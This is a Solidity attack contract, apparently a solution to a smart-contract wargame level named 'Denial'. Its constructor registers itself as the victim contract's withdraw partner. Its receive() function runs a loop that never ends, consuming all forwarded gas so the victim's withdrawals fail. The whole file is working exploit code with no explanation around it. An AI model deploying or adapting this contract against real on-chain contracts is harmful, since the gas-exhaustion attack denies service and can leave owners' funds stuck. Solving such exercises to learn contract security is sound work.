// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Denial.sol";

contract AttackDenial {
    address payable public victim;
    address payable owner;

    constructor(address payable _victim) public {
        owner = msg.sender;
        victim = _victim;
        Denial(victim).setWithdrawPartner(address(this));
    }

    receive() external payable {
        for (uint256 i = 0; i < 2; i) {
            // infinite loop
            owner.transfer(address(this).balance);
        }
    }
}
